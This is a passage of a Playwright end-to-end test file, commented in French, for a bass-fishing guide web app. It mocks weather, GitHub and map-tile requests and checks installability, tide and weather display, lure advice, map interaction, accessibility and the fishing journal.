// Tests de bout en bout dans Chromium (Playwright), sur les pages construites
// (racine du dépôt), servies comme sur GitHub Pages (/guide-peche-bar/...). Open-Meteo,
// l'API GitHub et les tuiles OpenStreetMap sont simulés au niveau du réseau ;
// tout le reste est réel.
import { chromium, devices } from "playwright";
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { omRespond } from "./om_mock.mjs";

const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
const SHOTS = process.env.SHOTS || path.join(ROOT, "tests/shots");
fs.mkdirSync(SHOTS, { recursive: true });
const PREFIX = "/guide-peche-bar";
const DOCS = ROOT;   // le site est construit à la racine du dépôt
// Tuile de carte factice (PNG 1×1) : aucun appel réel à OpenStreetMap pendant les tests.
const PNG1 = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==", "base64");
import { SITE_FILES } from "../scripts/sites.mjs";
const TYPES = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".json": "application/json", ".webmanifest": "application/manifest+json", ".png": "image/png" };
const server = http.createServer((req, res) => {
  let p = decodeURIComponent(new URL(req.url, "http://x").pathname);
  if (!p.startsWith(PREFIX)) { res.writeHead(404); return res.end(); }
  p = p.slice(PREFIX.length) || "/";
  if (p.endsWith("/")) p += "index.html";
  // Seuls les fichiers du site sont servis : preuve qu'ils suffisent une fois déposés sur GitHub.
  if (!SITE_FILES.includes(p.slice(1))) { res.writeHead(404); return res.end("404"); }
  const f = path.join(DOCS, p);
  if (!f.startsWith(DOCS) || !fs.existsSync(f)) { res.writeHead(404); return res.end("404"); }
  res.writeHead(200, { "Content-Type": TYPES[path.extname(f)] || "application/octet-stream", "Cache-Control": "no-cache" });
  fs.createReadStream(f).pipe(res);
});
await new Promise((r) => server.listen(8765, r));
const BASE = `http://localhost:8765${PREFIX}`;

const browser = await chromium.launch();
// Toute violation de la politique de sécurité (CSP), dans n'importe quel parcours, fait échouer les tests.
const cspViolations = [];
const watchCsp = (c, tag = "") => c.on("console", (m) => { if (/Content Security Policy|Refused to (load|connect|execute|apply)/i.test(m.text()) && !/exemple\.invalid|__xss/.test(m.text())) cspViolations.push(`${tag}${m.text().slice(0, 160)}`); });
const _newContext = browser.newContext.bind(browser);
browser.newContext = async (o) => { const c = await _newContext(o); watchCsp(c); return c; };
const results = [];
const ok = (cond, label) => results.push([!!cond, label]);

// ── Faux dépôt GitHub (API contents) ──
function fakeGitHub(opts = {}) {
  const files = new Map(Object.entries(opts.files || {}).map(([k, v]) => [k, { content: v, sha: "s" + Math.random().toString(36).slice(2) }]));
  const log = [];
  let conflicts = opts.conflicts || 0;
  const handler = async (route) => {
    const req = route.request(); const u = new URL(req.url());
    const m = u.pathname.match(/^\/repos\/([^/]+)\/([^/]+)(?:\/contents\/(.+))?$/);
    log.push(req.method() + " " + u.pathname);
    const auth = req.headers()["authorization"] || "";
    const json = (status, body) => route.fulfill({ status, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify(body) });
    if (opts.status401 || auth !== "Bearer github_pat_TEST") return json(401, { message: "Bad credentials" });
    if (!m) return json(404, { message: "Not Found" });
    if (!m[3]) return json(200, { full_name: `${m[1]}/${m[2]}`, private: true });
    const file = decodeURIComponent(m[3]);
    if (req.method() === "GET") {
      const f = files.get(file);
      if (!f) return json(404, { message: files.size ? "Not Found" : "This repository is empty." });
      return json(200, { name: file, sha: f.sha, encoding: "base64", content: Buffer.from(f.content, "utf8").toString("base64").replace(/(.{60})/g, "$1\n") });
    }
    if (req.method() === "PUT") {
      const body = JSON.parse(req.postData());
      if (conflicts > 0) { conflicts--; return json(409, { message: "is at x but expected y" }); }
      const cur = files.get(file);
      if (cur && body.sha !== cur.sha) return json(409, { message: "sha mismatch" });
      const sha = "s" + Math.random().toString(36).slice(2);
      files.set(file, { content: Buffer.from(body.content, "base64").toString("utf8"), sha });
      return json(cur ? 200 : 201, { content: { sha } });
    }
    return json(405, {});
  };
  return { handler, files, log };
}

async function openApp(site, { scenario = "nominal", sync = null, gh = null, init = null, sw = "block", context = null } = {}) {
  const ctx = context || await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: sw });
  const page = await ctx.newPage();
  const errors = [];
  page.on("pageerror", (e) => errors.push("pageerror: " + e.message));
  page.on("console", (m) => { if (m.type() === "error" && !/Failed to load resource/.test(m.text())) errors.push("console: " + m.text()); });
  const om = { calls: 0, scenario, tiles: 0 };
  await ctx.route(/tile\.openstreetmap\.org/, (route) => { om.tiles++; return route.fulfill({ status: 200, contentType: "image/png", body: PNG1 }); });
  await ctx.route(/open-meteo\.com/, async (route) => {
    om.calls++;
    if (om.scenario === "offline") return route.abort("internetdisconnected");
    const r = omRespond(route.request().url(), om.scenario);
    await route.fulfill({ status: r.status, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify(r.body) });
  });
  if (gh) await ctx.route(/api\.github\.com/, gh.handler);
  if (sync) await ctx.addInitScript((c) => { if (!localStorage.getItem("bar:sync")) localStorage.setItem("bar:sync", JSON.stringify(c)); }, sync);
  if (init) await ctx.addInitScript(init);
  await page.goto(`${BASE}/${site}.html`);
  return { ctx, page, errors, om };
}
const T = (page) => page.evaluate(() => document.body.innerText);
const waitCalls = async (om, n, ms = 8000) => { const t0 = Date.now(); while (om.calls < n && Date.now() - t0 < ms) await new Promise((r) => setTimeout(r, 50)); };
const waitText = (page, re, ms = 15000) => page.waitForFunction((src) => new RegExp(src).test(document.body.innerText), re.source, { timeout: ms });
const READY = /Conditions du jour/;
const WX = /🌬 [A-Z]{1,3} \d+ km\/h/;   // la météo du créneau est arrivée
const tab = async (page, name) => { await page.getByRole("tab", { name, exact: true }).click(); await page.waitForTimeout(250); };
const btn = (page, name) => page.getByRole("button", { name }).first();

// ── 0. Page d'accueil : une seule application (accueil + cinq guides) ──
{
  const ctx = await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", serviceWorkers: "block" });
  await ctx.route(/open-meteo\.com/, async (route) => { const r = omRespond(route.request().url(), "nominal");
    await route.fulfill({ status: r.status, contentType: "application/json", body: JSON.stringify(r.body) }); });
  await ctx.route(/tile\.openstreetmap\.org/, (route) => route.fulfill({ status: 200, contentType: "image/png", body: PNG1 }));
  const page = await ctx.newPage(); const bad = [], errs = [];
  page.on("response", (r) => { if (r.status() >= 400 && r.url().startsWith(BASE)) bad.push(r.url()); });
  page.on("pageerror", (e) => errs.push(e.message));
  await page.goto(`${BASE}/`);
  const home = await T(page);
  ok(/Logonna-Daoulas/.test(home) && /Pirou Plage/.test(home) && /Plouguerneau/.test(home) && /Audierne/.test(home) && /Carantec/.test(home), "accueil : cinq guides proposés");
  ok(/Version 8\.8 · [0-9a-f]{12}/.test(home), "accueil : numéro de version affiché (vérifier le dépôt)");
  ok(await page.isVisible("#install") && !(await page.isVisible("#install-btn")) && /Installer sur le téléphone/.test(home), "accueil (navigateur) : aide à l'installation, pas de bouton tant que Chrome ne le propose pas");
  await page.screenshot({ path: `${SHOTS}/accueil.png` });
  // Manifeste commun : une application, qui s'ouvre sur l'accueil.
  const m = await page.evaluate(async () => (await fetch(document.querySelector("link[rel=manifest]").href)).json());
  ok(m.id === undefined && m.start_url === "./" && m.scope === "./" && m.display === "standalone" && m.name && m.short_name, "manifeste commun : ouverture sur l'accueil, portée = tout le site, identifiant = start_url");
  const icons = await page.evaluate(async (list) => Promise.all(list.map(async (i) => {
    const r = await fetch(i.src); const b = await createImageBitmap(await r.blob()); return { ...i, ok: r.ok, w: b.width, h: b.height };
  })), m.icons);
  ok(icons.some((i) => i.sizes === "192x192" && i.w === 192 && i.h === 192 && i.purpose === "any")
    && icons.some((i) => i.sizes === "512x512" && i.w === 512 && i.h === 512 && i.purpose === "any")
    && icons.some((i) => i.purpose === "maskable" && i.w === 512), "manifeste : icônes 192 et 512 (dimensions réelles) + maskable");
  const sc = await page.evaluate(async (list) => Promise.all(list.map(async (x) => (await fetch(x.url)).ok)), m.shortcuts || []);
  ok(m.shortcuts?.length === 5 && sc.every(Boolean) && m.shortcuts.map((x) => x.url).join() === "./logonna.html,./pirou.html,./plouguerneau.html,./audierne.html,./carantec.html", "manifeste : raccourcis directs vers les cinq guides");
  // Bouton « Installer » : apparaît quand Chrome signale l'installation possible, et la lance.
  await page.evaluate(() => {
    const e = new Event("beforeinstallprompt", { cancelable: true });
    e.prompt = () => { window.__prompted = true; }; e.userChoice = Promise.resolve({ outcome: "accepted", platform: "web" });
    window.dispatchEvent(e); window.__bipDefault = e.defaultPrevented;
  });
  ok(await page.isVisible("#install-btn") && await page.evaluate(() => window.__bipDefault), "accueil : bouton « Installer l'application » quand Chrome le permet");
  await page.click("#install-btn");
  await page.evaluate(() => window.dispatchEvent(new Event("appinstalled")));
  ok(await page.evaluate(() => window.__prompted) && !(await page.isVisible("#install-btn")) && /Application installée/.test(await T(page)), "accueil : le bouton lance l'installation, confirmation affichée");
  // Les trois pages déclarent le même manifeste (donc la même application).
  const mhref = await page.evaluate(() => document.querySelector("link[rel=manifest]").href);
  await page.click('a[href="pirou.html"]'); await waitText(page, READY);
  ok(/Guide du bar · Pirou Plage/.test(await T(page)), "accueil → Pirou : le guide s'ouvre");
  ok(await page.evaluate(() => document.querySelector("link[rel=manifest]").href) === mhref, "Pirou : même manifeste que l'accueil");
  // Retour à l'accueil depuis le titre du guide (pas de barre d'adresse dans l'application installée).
  await page.getByRole("link", { name: /Guide du bar · Pirou Plage/ }).click();
  await page.waitForURL(/index\.html$/);
  ok(/Pirou Plage/.test(await T(page)) && /Logonna-Daoulas/.test(await T(page)), "Pirou → titre → retour à l'accueil");
  await page.click('a[href="logonna.html"]'); await waitText(page, READY);
  ok(await page.evaluate(() => document.querySelector("link[rel=manifest]").href) === mhref, "Logonna : même manifeste que l'accueil");
  ok(bad.length === 0, "aucun fichier manquant" + (bad.length ? " — " + bad.join(", ") : ""));
  ok(errs.length === 0, "accueil et guides : aucune erreur JavaScript" + (errs.length ? " — " + errs.join(" | ") : ""));
  await ctx.close();
}
// Dans l'application installée, l'aide à l'installation disparaît.
{
  const ctx = await browser.newContext({ ...devices["Pixel 7"], locale: "fr-FR", serviceWorkers: "block" });
  await ctx.addInitScript(() => { const mm = window.matchMedia.bind(window);
    window.matchMedia = (q) => (/display-mode:\s*standalone/.test(q) ? { matches: true, media: q, addEventListener() {}, removeEventListener() {}, addListener() {}, removeListener() {} } : mm(q)); });
  const page = await ctx.newPage();
  await page.goto(`${BASE}/`);
  ok(!(await page.isVisible("#install")) && /Logonna-Daoulas/.test(await T(page)), "application installée : accueil sans bloc d'installation");
  await ctx.close();
}
// Installabilité selon Chromium lui-même (critères d'installation de Chrome), depuis l'accueil
// et chaque guide. Il faut le Chromium complet (nouveau mode sans écran) et un profil non
// privé : l'ancien mode sans écran répond « installable » même sans manifeste.
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pwa-"));
  const ctx = await chromium.launchPersistentContext(dir, { channel: "chromium", locale: "fr-FR" });
  watchCsp(ctx, "[installabilité] ");
  await ctx.route(/open-meteo\.com/, async (route) => { const r = omRespond(route.request().url(), "nominal");
    await route.fulfill({ status: r.status, contentType: "application/json", body: JSON.stringify(r.body) }); });
  await ctx.route(/tile\.openstreetmap\.org/, (route) => route.fulfill({ status: 200, contentType: "image/png", body: PNG1 }));
  const page = ctx.pages()[0] || await ctx.newPage();
  const cdp = await ctx.newCDPSession(page);
  const check = async (u) => {
    await page.goto(`${BASE}/${u}`); await page.waitForLoadState("load");
    await page.evaluate(() => navigator.serviceWorker?.ready);
    const inst = (await cdp.send("Page.getInstallabilityErrors")).installabilityErrors.map((e) => e.errorId);
    const am = await cdp.send("Page.getAppManifest");
    const id = await cdp.send("Page.getAppId").catch(() => ({}));
    return { errs: [...inst, ...am.errors.map((e) => e.message)], appId: id.appId };
  };
  // Témoin : sans manifeste, Chromium doit refuser (sinon le contrôle ne prouverait rien).
  await ctx.route(/\/manifest\.json$/, (route) => route.fulfill({ status: 404, body: "" }));
  const neg = await check("");
  ok(neg.errs.length > 0, "témoin : manifeste absent → Chromium refuse l'installation (" + neg.errs.join(", ") + ")");
  await ctx.unroute(/\/manifest\.json$/);
  const ids = [];
  for (const u of ["", "logonna.html", "pirou.html", "plouguerneau.html", "audierne.html", "carantec.html"]) {
    const r = await check(u);
    ids.push(r.appId);
    ok(r.errs.length === 0, `installable selon Chromium : /${u}` + (r.errs.length ? " — " + r.errs.join(", ") : ""));
  }
  ok(ids.every((x) => x === `${BASE}/`), "accueil et guides : une seule et même application, identifiant = dossier du site" + ` — ${ids.join(", ")}`);
  await ctx.close(); fs.rmSync(dir, { recursive: true, force: true });
}

// Profil de chaque guide : ce que les parcours vérifient sur ses fiches.
const PROFILE = {
  logonna: { nSpots: 11, header: /Guide du bar · Logonna-Daoulas/, target: "Moulin Mer", pick: ["rostiviec", "Rostiviec"], sec: ["Térénez", /coef > 85|Aujourd'hui :/], reg: /3 bars \/ pêcheur \/ jour · taille minimale 42 cm/ },
  pirou: { nSpots: 10, header: /Guide du bar · Pirou Plage/, target: "Goury", pick: ["portbail", "Portbail"], sec: ["Goury", /6 nœuds/], reg: /3 bars \/ pêcheur \/ jour · taille minimale 42 cm/ },
  plouguerneau: { nSpots: 10, header: /Guide du bar · Plouguerneau/, target: "Pointe de Corsen", pick: ["kerlouan", "Kerlouan"], sec: ["Pointe de Corsen", /falaises/], reg: /3 bars \/ pêcheur \/ jour · taille minimale 42 cm/ },
  audierne: { nSpots: 11, header: /Guide du bar · Audierne/, target: "Pointe du Raz", pick: ["penhors", "Penhors"], sec: ["Pointe du Raz", /6 nœuds/], reg: /[23] bars \/ pêcheur \/ jour · taille minimale 42 cm/ },
  carantec: { nSpots: 6, header: /Guide du bar · Carantec/, target: "Pointe de Primel", pick: ["locquirec", "Locquirec"], sec: ["Barnénez", /passages rocheux/], reg: /3 bars \/ pêcheur \/ jour · taille minimale 42 cm/ },
};
for (const site of (process.env.ONLY ? process.env.ONLY.split(",").filter((x) => PROFILE[x]) : Object.keys(PROFILE))) {
  const L = (s) => `[${site}] ${s}`;
  const PF = PROFILE[site];
  const nSpots = PF.nSpots;
  // ── 1. Parcours nominal ──
  {
    const { ctx, page, errors, om } = await openApp(site);
    await waitText(page, WX);
    const txt = await T(page);
    ok(/Marée/.test(txt) && /coef \d+/.test(txt) && /PM \d\dh\d\d/.test(txt), L("synthèse : marée affichée"));
    ok(/km\/h/.test(txt) && /hPa/.test(txt), L("synthèse : météo réelle affichée (km/h, hPa)"));
    // Jour (3 requêtes), puis la tendance de la semaine, chargée d'office (3 requêtes pour 7 jours).
    await page.getByRole("group", { name: "Note du meilleur créneau, jour par jour" }).waitFor({ timeout: 20000 }).catch(() => {});
    await waitCalls(om, 6); await page.waitForTimeout(300);
    ok(om.calls === 6, L(`3 requêtes Open-Meteo pour le jour, 3 pour la semaine (${om.calls})`));
    ok(/🌬 [A-Z]{1,3} \d+ km\/h/.test(txt), L("verdict : météo du créneau affichée"));
    ok(/Leurre conseillé pour ce créneau/.test(txt) && /Poids · /.test(txt) && /Couleur ·/.test(txt) && /Nage ·/.test(txt), L("synthèse : leurre précis de ta boîte (poids, couleur, nage)"));
    ok(/(Asturie|Patchinko|Z Claw|Mr Joe|Black Minnow|Crazy Paddle Tail|Master Shad|Dark Sleeper|Spindle Worm|X-Layer|Craw)/.test(txt.split("Leurre conseillé pour ce créneau")[1]?.slice(0, 80) || ""), L("synthèse : le leurre nommé est un modèle de ta boîte"));
    ok(/Journal sur cet appareil seulement/.test(txt), L("bandeau de sauvegarde : état local"));
    ok(PF.header.test(txt) && Object.entries(PROFILE).every(([k, o]) => k === site || !o.header.test(txt)), L("en-tête propre au site (aucun texte d'une autre application)"));
    const sw = await page.evaluate(() => [document.scrollingElement.scrollWidth, window.innerWidth]);
    ok(sw[0] <= sw[1] + 1, L(`pas de défilement horizontal sur mobile (${sw[0]} ≤ ${sw[1]})`));
    const yv = await page.evaluate(() => { const f = (re) => [...document.querySelectorAll("div,span,h2")].find((e) => re.test(e.textContent) && e.children.length === 0); const a = f(/^Meilleur choix$/), b = f(/^Conditions du jour$/); return a && b ? [a.getBoundingClientRect().top, b.getBoundingClientRect().top] : null; });
    ok(yv && yv[0] < yv[1] && yv[0] < 700, L(`verdict du jour en tête de page (${yv && Math.round(yv[0])} px)`));
    await page.screenshot({ path: `${SHOTS}/${site}-synthese.png` });
    // Chaque tuile ouvre l'onglet qui la détaille
    await page.getByRole("button", { name: /Marée/ }).first().click(); await page.waitForTimeout(300);
    ok(/Calculée sur l'appareil/.test(await T(page)) && /Pleine mer/.test(await T(page)) && (await page.evaluate(() => location.hash)) === "#maree", L("tuile Marée → onglet Marée (adresse #maree)"));
    await page.goBack(); await page.waitForTimeout(300);
    ok(READY.test(await T(page)), L("bouton retour → synthèse"));
    await tab(page, "Météo");
    ok(/Open-Meteo · AROME/.test(await T(page)) && /Spot par spot/.test(await T(page)), L("onglet Météo : source et météo spot par spot"));
    // Un spot choisi hors du TOP 3 doit s'afficher (et non le n°1)
    const target = PF.target;
    await tab(page, "Spots");
    await btn(page, /^Voir les \d+/).click();
    await page.getByRole("button", { name: new RegExp(target) }).first().click();
    await page.waitForTimeout(500);
    ok(await page.evaluate((n) => [...document.querySelectorAll("h2")].some((h) => h.textContent === n), target), L(`fiche du spot choisi hors TOP 3 (${target})`));
    await btn(page, /^Terrain$/).click();
    ok(/Terrain · encombrement 3\/3/.test(await T(page)) && /Pas de pêche à gratter/.test(await T(page)), L(`${target} : fiche terrain affichée`));
    await tab(page, "Leurres");
    await btn(page, /Ce que mange le bar ce mois-ci/).click();
    if (site === "logonna") ok(/Ici, pas de pêche (au fond|à mi-eau)/.test(await T(page)) && /Moulin Mer/.test(await page.inputValue('select[aria-label="Spot"]').then(() => T(page))), L("Moulin Mer : proie de fond réécrite (pas de grattage)"));
    const lt = await T(page);
    ok(/Dans ta boîte, pour ce créneau/.test(lt) && /Poids · /.test(lt) && /Famille de leurre/.test(lt) && /Couleur/.test(lt) && /Taille et poids/.test(lt) && /Animation/.test(lt), L("onglet Leurres : conseil complet"));
    ok(/(vent (de face|de dos|de travers) F\d)/.test(lt) && /(très peu d'eau|peu d'eau|tombant)/.test(lt), L("onglet Leurres : vent par rapport au pêcheur et profondeur estimée affichés"));
    await page.getByText("Toute ta boîte, classée pour ce créneau").click();
    await page.getByText("Fiches techniques de ta boîte").click();
    const lt2 = await T(page);
    ok(/Xorus Asturie/.test(lt2) && /130 mm : 27 g/.test(lt2) && /Sakura Mr Joe/.test(lt2) && /120 mm : 35 g/.test(lt2), L("onglet Leurres : fiches techniques relevées (Asturie 130 : 27 g, Mr Joe 120 : 35 g)"));
    ok(await page.locator('a[href*="peche.com"]').count() >= 5, L("onglet Leurres : sources en lien"));
    await tab(page, "Synthèse");
    await page.screenshot({ path: `${SHOTS}/${site}-full.png`, fullPage: true });
    // Jour suivant puis précédent
    const tideTile = () => page.evaluate(() => [...document.querySelectorAll("button")].find((b) => /^↕ Marée/.test(b.textContent.trim()))?.textContent || "");
    const tideBefore = await tideTile();
    await page.click('button[title="Jour suivant"]');
    await page.waitForTimeout(800); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    ok(tideBefore && tideBefore !== await tideTile(), L("jour suivant : marée recalculée"));
    ok(om.calls === 6, L(`jour suivant : météo reprise de la semaine déjà téléchargée (${om.calls})`));
    await page.click('button[title="Jour précédent"]');
    await page.waitForTimeout(800); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    ok(om.calls === 6, L(`retour au jour : météo servie par le cache (${om.calls})`));
    await page.click('button[title="Retélécharger la météo (ignore le cache)"]');
    await waitCalls(om, 9); await page.waitForTimeout(300); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    ok(om.calls === 9, L(`bouton retélécharger (${om.calls})`));
    // Journal : saisie et persistance après rechargement
    await tab(page, "Journal");
    await page.fill('input[placeholder^="Asturie"]', "Test e2e leurre");
    await page.fill('input[type="time"]', "19:15");
    await btn(page, /^Enregistrer$/).click();
    await page.waitForTimeout(500);
    const stored = await page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith("bar:journal:")).map((k) => localStorage.getItem(k)).join(""));
    ok(/Test e2e leurre/.test(stored), L("session enregistrée dans le navigateur"));
    const ent = JSON.parse(stored || "[]").find((e) => e.lure === "Test e2e leurre");
    ok(ent && ent.heure === "19:15" && ent.cond && ent.cond.vent && ent.cond.vent.kmh > 0 && ent.cond.coef > 0 && ent.cond.phase, L("session : heure et conditions enregistrées (marée, vent, coef)"));
    ok(/19h15 · (montant|descendant)/.test(await T(page)), L("journal : conditions affichées sous la session"));
    await page.reload(); await waitText(page, /Nouvelle session/);
    ok((await page.evaluate(() => location.hash)) === "#journal", L("rechargement : l'onglet ouvert est conservé"));
    await page.waitForTimeout(600);
    ok(om.calls === 9, L(`rechargement : météo du cache, aucun appel (${om.calls})`));
    ok(/Test e2e leurre/.test(await T(page)), L("journal conservé après rechargement"));
    ok(errors.length === 0, L("aucune erreur JavaScript" + (errors.length ? " — " + errors.slice(0, 2).join(" | ") : "")));
    await ctx.close();
  }
  // ── 1 bis. Heures de pêche, semaine, frise ──
  {
    const { ctx, page, errors, om } = await openApp(site);
    await waitText(page, WX);
    await btn(page, /Fiche du spot/).click(); await page.waitForTimeout(400);
    ok(await page.locator('svg[aria-label^="Journée sur"]').count() === 1, L("frise de la journée affichée dans la fiche du spot"));
    await page.selectOption('select[aria-label="Début"]', "6");
    await page.selectOption('select[aria-label="Fin"]', "22");
    await page.waitForTimeout(300);
    await tab(page, "Synthèse");
    const vt = await T(page);
    const m = vt.slice(vt.indexOf("Meilleur choix")).match(/(\d{2})h(\d{2}) → (\d{2})h(\d{2})/);
    const s = m ? +m[1] + +m[2] / 60 : null, e = m ? +m[3] + +m[4] / 60 : null;
    ok(m && Math.min(e < s ? e + 24 : e, 22) - Math.max(s, 6) >= 0.5, L(`heures 6 h → 22 h : le verdict propose un créneau dans ces heures (${m && m[0]})`));
    await page.reload(); await waitText(page, READY);
    await tab(page, "Spots");
    ok(await page.inputValue('select[aria-label="Début"]') === "6", L("heures de pêche mémorisées sur l'appareil"));
    await tab(page, "Synthèse");
    // v8.7 : la tendance de la semaine est en tête de la synthèse, chargée d'office (sans toucher de bouton).
    const strip = page.getByRole("group", { name: "Note du meilleur créneau, jour par jour" });
    await strip.waitFor({ timeout: 20000 }).catch(() => {});
    const rows = await strip.getByRole("button").count();
    ok(rows === 7, L(`semaine : chargée d'office, 7 jours dans la tendance (${rows})`));
    const order = await page.evaluate(() => { const top = (re) => { const el = [...document.querySelectorAll("section, div")].find((n) => n.children.length && re.test(n.firstElementChild?.textContent || "")); return el ? el.getBoundingClientRect().top : null; };
      const wk = [...document.querySelectorAll("*")].find((n) => n.childElementCount === 0 && /^Tendance de la semaine$/.test(n.textContent.trim()));
      const vd = [...document.querySelectorAll("*")].find((n) => n.childElementCount === 0 && /^Meilleur choix$/.test(n.textContent.trim()));
      return { wk: wk?.getBoundingClientRect().top ?? null, vd: vd?.getBoundingClientRect().top ?? null, top }; });
    ok(order.wk != null && order.vd != null && order.wk < order.vd, L(`semaine : tendance affichée au-dessus du verdict du jour (${order.wk} < ${order.vd})`));
    const c1 = om.calls;
    await strip.getByRole("button").nth(2).click();
    await page.waitForTimeout(900); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    ok(om.calls === c1, L("semaine → jour choisi : météo reprise du cache, aucune requête"));
    ok(await strip.getByRole("button").nth(2).getAttribute("aria-pressed") === "true", L("semaine : le jour choisi est marqué dans la tendance"));
    ok(errors.length === 0, L("heures/semaine/frise : aucune erreur JavaScript" + (errors.length ? " — " + errors[0] : "")));
    await ctx.close();
  }
  // ── 1 ter. Onglets, carte, sécurité, orientation, session en cours, réglementation ──
  {
    const { ctx, page, errors, om } = await openApp(site);
    await waitText(page, WX);
    const tabs = await page.evaluate(() => [...document.querySelectorAll("nav [role=tab]")].map((b) => b.textContent.trim()));
    ok(tabs.join(",") === "Synthèse,Spots,Photos,Leurres,Marée,Météo,Saison,Journal,Règles", L(`onglets (${tabs.join(",")})`));
    const navTop = await page.evaluate(() => { window.scrollTo(0, 1500); return new Promise((r) => setTimeout(() => r(document.querySelector("nav").getBoundingClientRect().top), 150)); });
    ok(navTop <= 1, L(`barre d'onglets collante après défilement (${navTop})`));
    ok(PF.reg.test(await T(page)), L("réglementation 2026 rappelée sur la synthèse"));
    // Accessibilité : titre, onglets reliés au panneau, clavier
    const aria = await page.evaluate(() => ({ h1: document.querySelectorAll("h1").length, panel: document.querySelector('[role="tabpanel"]')?.getAttribute("aria-labelledby"),
      sel: document.querySelector('[role="tab"][aria-selected="true"]')?.id, tabbable: [...document.querySelectorAll('[role="tab"]')].filter((b) => b.tabIndex === 0).length }));
    ok(aria.h1 === 1 && aria.panel === aria.sel && aria.tabbable === 1, L(`onglets : h1 unique, panneau relié, un seul onglet dans l'ordre de tabulation (${JSON.stringify(aria)})`));
    await page.focus('[role="tab"][aria-selected="true"]');
    await page.keyboard.press("ArrowRight"); await page.waitForTimeout(150);
    const kb1 = await page.evaluate(() => [location.hash, document.activeElement?.textContent]);
    await page.keyboard.press("End"); await page.waitForTimeout(150);
    const kb2 = await page.evaluate(() => location.hash);
    await page.keyboard.press("Home"); await page.waitForTimeout(150);
    ok(kb1[0] === "#spots" && kb1[1] === "Spots" && kb2 === "#regles" && (await page.evaluate(() => location.hash)) === "#synthese", L(`onglets au clavier : flèche, fin, début (${kb1.join(" ")} · ${kb2})`));
    // Meilleur créneau de plein jour, quand le verdict tombe en basse lumière ou de nuit
    const dayCard = /Si tu pêches en plein jour/.test(await T(page)), verdictLow = /aube|crépuscule|nuit/i.test(await page.evaluate(() => document.querySelector("main")?.innerText.split("Leurre conseillé")[0] || ""));
    ok(dayCard === verdictLow || (verdictLow && !dayCard && !/jour/.test(await T(page))), L(`synthèse : créneau de plein jour affiché si le verdict est en basse lumière (${verdictLow ? "basse lumière" : "jour"}, carte ${dayCard ? "affichée" : "absente"})`));
    if (dayCard) {
      await btn(page, /Le conseil leurres de ce créneau/).click();
      await page.waitForTimeout(300);
      ok((await page.evaluate(() => location.hash)) === "#leurres" && /☀ (plein soleil|jour|ciel couvert)/.test(await T(page)), L("créneau de plein jour : l'onglet Leurres s'ouvre sur ce créneau"));
      await tab(page, "Synthèse");
    }
    // Carte
    await tab(page, "Spots");
    await page.waitForFunction((n) => document.querySelectorAll(".leaflet-container path.leaflet-interactive").length >= n, nSpots + 1, { timeout: 8000 }).catch(() => {});
    const disks = await page.evaluate(() => document.querySelectorAll(".leaflet-container path.leaflet-interactive").length);
    ok(disks === nSpots + 1, L(`carte : ${nSpots} spots + le village (${disks})`));
    ok(om.tiles > 0 && /OpenStreetMap/.test(await T(page)), L(`carte : fond OpenStreetMap chargé et attribué (${om.tiles} tuiles)`));
    ok(await page.evaluate(() => document.querySelectorAll(".leaflet-tooltip").length) >= 3, L("carte : étiquettes du TOP 3 visibles"));
    const [pickId, pickName] = PF.pick;
    // Le disque peut tomber sous le bandeau du bas : on le centre avant de le toucher.
    const disk = page.locator(`path.spot-${pickId}`);
    await disk.evaluate((el) => el.scrollIntoView({ block: "center" }));
    await page.waitForTimeout(200);
    await disk.click({ force: true });
    await page.waitForTimeout(500);
    ok(new RegExp(pickName).test(await page.evaluate(() => document.querySelector("h2")?.textContent || "")), L("carte → fiche du spot touché"));
    // Sécurité
    await btn(page, /^Voir les \d+/).click();
    await page.getByRole("button", { name: new RegExp(PF.sec[0]) }).first().click();
    await page.waitForTimeout(300);
    await btn(page, /^Accès$/).click();
    const ta = await T(page);
    ok(/Sécurité sur ce spot/.test(ta) && PF.sec[1].test(ta), L("sécurité : consignes sourcées dans l'onglet Accès"));
    // Orientation
    await btn(page, /^Terrain$/).click();
    ok(/Orientation du poste/.test(await T(page)), L("orientation : boussole affichée"));
    await btn(page, /C'est juste/).click();
    await page.waitForTimeout(300);
    const or = await page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith("bar:orient:")).map((k) => localStorage.getItem(k)).join(""));
    ok(/"water"/.test(or) && /Orientation confirmée/.test(await T(page)), L("orientation : confirmée, mémorisée sur l'appareil"));
    await page.selectOption('select[aria-label="Direction de l\'eau"]', "E");
    await page.waitForTimeout(300);
    ok(/Orientation corrigée/.test(await T(page)) && /Corrigée sur place/.test(await T(page)), L("orientation : corrigée, le classement suit"));
    // Session en cours
    await btn(page, /Je pêche ici maintenant/).click();
    await waitText(page, /Terminer et noter/);
    ok(await page.evaluate(() => { const n = document.querySelector('[role="status"]'); const r = n?.getBoundingClientRect(); const nav = document.querySelector("nav").getBoundingClientRect(); return !!n && /Session en cours/.test(n.textContent) && r.top >= nav.bottom - 0.5 && r.height <= 52; }), L("session en cours : bandeau compact, sous les onglets, sans chevauchement"));
    ok(await page.evaluate(() => Object.keys(localStorage).some((k) => k.startsWith("bar:encours:"))), L("session en cours : démarrée et mémorisée"));
    await btn(page, "Terminer et noter").click();
    await page.waitForTimeout(500);
    const pre = await page.evaluate(() => [document.querySelector('input[type="time"]')?.value, document.querySelector('input[aria-label="Durée de la session en heures"]')?.value, location.hash]);
    ok(/^\d\d:\d\d$/.test(pre[0] || "") && pre[1] === "0,25" && pre[2] === "#journal", L(`session terminée : journal prérempli (heure ${pre[0]}, durée ${pre[1]} h)`));
    await btn(page, /^Enregistrer$/).click();
    await page.waitForTimeout(500);
